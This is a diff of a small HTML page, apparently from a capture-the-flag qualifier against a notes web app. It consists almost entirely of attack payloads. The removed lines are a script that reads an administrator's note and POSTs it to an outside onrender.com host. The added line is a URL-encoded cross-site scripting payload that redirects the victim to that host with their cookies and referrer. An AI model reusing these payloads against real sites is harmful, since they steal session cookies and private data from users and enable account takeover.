@@ -1,42 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Momo</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chocolate</title>
 </head>
 <body>
-    <script>
-        // Fonction pour exfiltrer les données
-        function exfiltrateData(data) {
-          var xhr = new XMLHttpRequest();
-          xhr.open("POST", "https://chocolate-7q8m.onrender.com/chocolate", true);
-          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-          xhr.send("chocolate=" + encodeURIComponent(data));
-        }
-      
-        // Requête pour obtenir l'ID de l'administrateur
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://notes.qualif.hackerlab.bj/api.php", true);
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState == 4 && xhr.status == 200) {
-            var response = JSON.parse(xhr.responseText);
-            var adminId = response.id; // Supposons que l'ID de l'admin est dans la clé "admin_id"
-            
-            // Requête pour obtenir le contenu de la note en utilisant l'ID de l'admin
-            var noteXhr = new XMLHttpRequest();
-            noteXhr.open("GET", "https://notes.qualif.hackerlab.bj/note.php?id=" + adminId, true);
-            noteXhr.onreadystatechange = function() {
-              if (noteXhr.readyState == 4 && noteXhr.status == 200) {
-                var noteContent = noteXhr.responseText;
-                exfiltrateData(noteContent);
-              }
-            };
-            noteXhr.send();
-          }
-        };
-        xhr.send();
-        
-        </script>      
+  https://notes.qualif.hackerlab.bj/api.php?username=%27%3Cscript%3Ewindow.location%3D%22https%3A%2F%2Fchocolate-7q8m.onrender.com%2F%3Fcookies%3D%22%2BencodeURIComponent%28document.cookie%29%2B%22%26url%3D%22%2BencodeURIComponent%28document.referrer%29%3B%3C%2Fscript%3E
 </body>
 </html>
